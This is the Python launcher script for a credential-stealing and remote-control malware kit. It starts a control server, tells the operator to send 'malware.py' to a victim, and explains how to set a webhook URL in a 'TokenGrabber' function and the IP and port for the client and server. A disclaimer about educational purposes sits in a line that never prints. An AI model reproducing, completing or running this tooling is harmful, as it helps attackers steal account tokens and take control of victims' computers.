"""
Copyright © 2022 !Jet#0728
This software is completely free and you are not allowed to sell it or to copy without any credits or asking for permission. Everything else is allowed, including modificaction and distribution.
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""
import time
import os
import os.path
import ctypes

def main():
    os.system("start "+ "python server.py")
    print("\nEverything looks to be working correctly. Send malware.py to the victim.")
    print("\nThe terminal that has just been opened is for controlling the vioctim's machine.")

def help():
    print("""
    
    Hey, I'm Jet, I'm gonna help you with this tool because is 
    not completely auto for the moment. For using this tool you
    will have to edit WEBHOOK_URL, IP AND PORT. This can be done
    by:

    1) Go to stealer.py and look for TokenGrabber() and add a 
    webhook url (line 19).

    2) For changing the IP and PORT in the client side, go to 
    client.py and change the IP and PORT in line 7.

    3) For changing the IP and PORT from the server side go to
    line 255 and do the same as before.
    
    
    Thanks for using!!

    Jet

    """
    )

    time.sleep(20)
    menu()

def menu():

    print("""
        ______      __       _____ __             __         
       / ____/___ _/ /_     / ___// /____  ____ _/ /__  _____
      / /_  / __ `/ __/_____\__ \/ __/ _ \/ __ `/ / _ \/ ___/
     / __/ / /_/ / /_/_____/__/ / /_/  __/ /_/ / /  __/ /    
    /_/    \__,_/\__/     /____/\__/\___/\__,_/_/\___/_/     

                    [@] Coded by JetBerri

        """
        )
    time.sleep(5)

    ("\nThis tool has been coded with educational purposes!")
    time.sleep(2)

    a = input("\nDid you change the IP, PORT and WebHook in the Stealer.py file? [y(es)/n(o)/h(elp)]: ")

    if a == "y":
        main()
    elif a == "h":
        help()
    else:
        print("Please, change the arguments.")
        time.sleep(2)
        exit()

menu()
